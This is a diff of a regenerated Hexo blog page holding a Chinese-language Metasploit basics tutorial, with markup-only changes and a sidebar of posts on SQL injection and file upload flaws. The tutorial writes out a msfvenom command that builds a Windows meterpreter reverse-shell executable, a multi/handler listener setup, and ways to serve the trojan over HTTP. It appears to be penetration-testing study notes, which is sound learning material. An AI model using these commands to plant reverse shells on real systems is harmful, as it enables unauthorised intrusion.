@@ -116,7 +116,7 @@
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#112;&#x61;&#115;&#115;&#x77;&#111;&#x72;&#100;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;">&#112;&#x61;&#115;&#115;&#x77;&#111;&#x72;&#100;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#112;&#x61;&#115;&#115;&#119;&#111;&#114;&#100;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#x31;">&#112;&#x61;&#115;&#115;&#119;&#111;&#114;&#100;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#x31;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -158,7 +158,7 @@
 <p>-n                设置空模块</p>
 <p>-i                    指定编码次数</p>
 <p>-x                    指定模板</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">基操:</span><br><span class="line">常用payload:</span><br><span class="line">windows/x64/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp_rc4 windows/x64/meterpreter/bind_tc windows/x64/meterpreter/bind_tcp_rc4 windows/x64/meterpreter/reverse_https windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">生成木马:</span><br><span class="line">-p指定的payload要与msfconsole指定的payload一致,不然无法监听到木马的反弹</span><br><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">建立监听器:</span><br><span class="line">LHOST:设置本地监听的IP</span><br><span class="line">LPORT:设置本地监听的端口</span><br><span class="line">RHOSTS:设置远程IP</span><br><span class="line"></span><br><span class="line">stage: 传输器    --&gt; 存放paylaod的一个容器</span><br><span class="line">stager: 传输体     --&gt; 用来传输stage的一个通道</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler 设置渗透模块</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp 设置有效载荷</span><br><span class="line">set LHOST IP 设置本地接收ip</span><br><span class="line">set LPORT port 设置本地接收端口</span><br><span class="line">exploit | run 运行模块开始监听</span><br><span class="line"></span><br><span class="line">木马下放:</span><br><span class="line"><span class="number">1.</span> servic apache2 start</span><br><span class="line">    apache是web服务的一个中间件</span><br><span class="line">    默认路径: /var/www/html</span><br><span class="line">    访问方式: http://IP</span><br><span class="line">    注意事项: 可能会碰到默认页面,删除掉/var/www/html下的index.html文件即可</span><br><span class="line"><span class="number">2.</span> python2</span><br><span class="line">    用编程语言开放的服务器,服务器路径的话就是在当前目录下开放服务</span><br><span class="line">    python -m SimpleHTTPServer port</span><br><span class="line"><span class="number">3.</span> python3</span><br><span class="line">    python3 -m http.server port</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">基操:</span><br><span class="line">常用payload:</span><br><span class="line">windows/x64/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp_rc4 windows/x64/meterpreter/bind_tc windows/x64/meterpreter/bind_tcp_rc4 windows/x64/meterpreter/reverse_https windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">生成木马:</span><br><span class="line">-p指定的payload要与msfconsole指定的payload一致,不然无法监听到木马的反弹</span><br><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">建立监听器:</span><br><span class="line">LHOST:设置本地监听的IP</span><br><span class="line">LPORT:设置本地监听的端口</span><br><span class="line">RHOSTS:设置远程IP</span><br><span class="line"></span><br><span class="line">stage: 传输器    --&gt; 存放paylaod的一个容器</span><br><span class="line">stager: 传输体     --&gt; 用来传输stage的一个通道</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler 设置渗透模块</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp 设置有效载荷</span><br><span class="line"><span class="built_in">set</span> LHOST IP 设置本地接收ip</span><br><span class="line"><span class="built_in">set</span> LPORT port 设置本地接收端口</span><br><span class="line">exploit | run 运行模块开始监听</span><br><span class="line"></span><br><span class="line">木马下放:</span><br><span class="line"><span class="number">1.</span> servic apache2 start</span><br><span class="line">    apache是web服务的一个中间件</span><br><span class="line">    默认路径: /var/www/html</span><br><span class="line">    访问方式: http://IP</span><br><span class="line">    注意事项: 可能会碰到默认页面,删除掉/var/www/html下的index.html文件即可</span><br><span class="line"><span class="number">2.</span> python2</span><br><span class="line">    用编程语言开放的服务器,服务器路径的话就是在当前目录下开放服务</span><br><span class="line">    python -m SimpleHTTPServer port</span><br><span class="line"><span class="number">3.</span> python3</span><br><span class="line">    python3 -m http.server port</span><br></pre></td></tr></table></figure>
 
 <h4 id="linux的快捷键"><a href="#linux的快捷键" class="headerlink" title="linux的快捷键"></a>linux的快捷键</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctrl+u    删除光标之前的内容</span><br><span class="line">ctrl+k    删除光标之后的内容</span><br><span class="line">ctrl+d  删除当前光标所在的内容</span><br><span class="line">ctrl+h    向前删除一个内容</span><br><span class="line">ctrl+a    跳到开头</span><br><span class="line">ctrl+e    跳到最后</span><br><span class="line">ctrl+r    搜索历史操作的指令,回车执行</span><br></pre></td></tr></table></figure>
 
@@ -166,7 +166,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckuz7tk0m0001povj8c2n4j4r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckv3dvtvw0002fcvj5pao4k0u" class="article-share-link">Share</a>
       
       
     </footer>
@@ -224,6 +224,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
           </li>
         
@@ -237,10 +241,6 @@
         
           <li>
             <a href="/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/">sql漏洞注入扩展和Access数据库</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
           </li>
         
       </ul>
